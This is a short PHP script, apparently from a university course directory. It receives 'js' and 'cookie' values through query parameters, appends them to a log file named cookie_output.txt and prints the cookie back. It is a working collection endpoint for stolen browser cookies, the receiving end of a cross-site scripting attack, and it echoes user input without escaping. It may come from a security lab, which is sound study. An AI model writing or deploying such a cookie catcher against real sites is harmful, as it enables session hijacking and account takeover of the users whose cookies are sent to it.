<?php
$c = file_put_contents("/cse/web/homes/lib49/cookie_output.txt", "javascript ".$_GET["js"]."\n    ".$_GET["cookie"]."\n", FILE_APPEND);
echo "secret cookie = ".$_GET["cookie"]
?>
